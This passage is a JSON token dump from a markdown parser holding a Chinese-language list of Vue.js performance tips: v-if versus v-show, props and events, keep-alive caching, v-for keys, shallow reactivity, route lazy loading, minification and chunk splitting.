DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>\\n* **1：** 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。\\n* **1：** 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。\\n* **1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key\\n* **2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。\\n* **2：** 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。\\n* **1：** 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>\\n* **1：** 合理设置chunk大小和数量（Webpack 相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>\\n","task":false,"loose":false,"text":"**1：** 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>","tokens":[{"type":"text","raw":"**1：** 合理使用v-show和v-if：<br/>\\n\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>","text":"**1：** 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理使用v-show和v-if：","text":" 合理使用v-show和v-if：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。","text":"\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。","text":"\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"}]}]},{"type":"list_item","raw":"* **1：** 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。\\n","task":false,"loose":false,"text":"**1：** 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","tokens":[{"type":"text","raw":"**1：** 优化组件的props和events传递：<br/>\\n\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","text":"**1：** 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化组件的props和events传递：","text":" 优化组件的props和events传递：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。","text":"\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","text":"\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。\\n","task":false,"loose":false,"text":"**1：** 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","tokens":[{"type":"text","raw":"**1：** 使用keep-alive缓存组件:<br/>\\n\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","text":"**1：** 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用keep-alive缓存组件:","text":" 使用keep-alive缓存组件:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。","text":"\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","text":"\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key\\n","task":false,"loose":false,"text":"**1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","tokens":[{"type":"text","raw":"**1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","text":"**1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 列表渲染优化: 为v-for列表添加key属性","text":" 列表渲染优化: 为v-for列表添加key属性","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。","text":"\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","text":"\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","escaped":false}]}]},{"type":"list_item","raw":"* **2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。\\n","task":false,"loose":false,"text":"**2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。","tokens":[{"type":"text","raw":"**2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n\\n对对象的第一层数据进行响应式处理，减少性能消耗。","text":"**2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 数据响应式优化: 避免过度的响应式数据","text":" 数据响应式优化: 避免过度的响应式数据","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。","text":"\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。","text":"\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。","escaped":false}]}]},{"type":"list_item","raw":"* **2：** 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。\\n","task":false,"loose":false,"text":"**2：** 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","tokens":[{"type":"text","raw":"**2：** 路由层面优化: 路由懒加载<br/>\\n\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n\\n快首屏加载速度。<br/>\\n\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","text":"**2：** 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 路由层面优化: 路由懒加载","text":" 路由层面优化: 路由懒加载","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。","text":"\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","text":"\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>\\n","task":false,"loose":false,"text":"**1：** 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>","tokens":[{"type":"text","raw":"**1：** 代码压缩和混淆（Webpack 相关）<br/>\\n\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>","text":"**1：** 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 